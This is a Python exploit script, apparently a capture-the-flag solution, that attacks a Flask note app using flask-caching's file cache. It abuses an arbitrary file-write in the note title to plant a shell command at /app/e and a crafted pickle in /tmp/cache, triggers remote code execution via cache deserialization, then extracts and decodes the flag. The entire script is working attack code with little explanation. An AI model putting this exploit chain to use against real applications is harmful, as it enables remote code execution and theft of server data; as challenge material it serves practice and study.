import os
import struct
import time
import hashlib
import urllib.parse
import httpx

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

shell_payload = """
bash -c "od /f*>*/*/*"
""".strip()
assert len(shell_payload) <= 24

pickle_payload = b"zzzz"
pickle_payload += b"""
cos
system
(Vsh e
tR
""".strip()
assert len(pickle_payload) <= 24

# ref. https://github.com/pallets-eco/cachelib/blob/0.13.0/src/cachelib/file.py#L222-L224
assert struct.unpack("I", pickle_payload[:4])[0] > time.time()

client = httpx.Client(base_url=f"http://{HOST}:{PORT}")

res = client.post(
    "/new",
    data={
        "title": "x",
        "content": "test",
    },
)
assert res.status_code == 302
result_path = res.headers["Location"]

res = client.post(
    "/new",
    data={
        "title": "/app/e",
        "content": shell_payload,
    },
)
assert res.status_code == 302

req_path = "/00000000-0000-0000-0000-000000000000/x"

# ref. https://github.com/pallets-eco/flask-caching/blob/v.2.3.0/src/flask_caching/__init__.py#L458-L497
cache_hash = str(hashlib.md5(str(tuple()).encode()).hexdigest())
cache_key = req_path + cache_hash

# ref. https://github.com/pallets-eco/cachelib/blob/0.13.0/src/cachelib/file.py#L210-L216
file_name = hashlib.md5(cache_key.encode()).hexdigest()
print(f"{file_name = }")

res = client.post(
    "/new",
    content=f"title=/tmp/cache/{file_name}&content={urllib.parse.quote(pickle_payload)}",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
    },
)
assert res.status_code == 302

res = client.get(req_path)
assert res.status_code == 500

res = client.get(result_path)
content = res.text.split("<p>")[1].split("</p>")[0]
print(f"{content = }")

flag = b""
for line in content.splitlines():
    for part in line.strip()[8:].split(" "):
        if not part:
            continue
        flag += int(part, base=8).to_bytes(2, "little")
print(flag.decode())
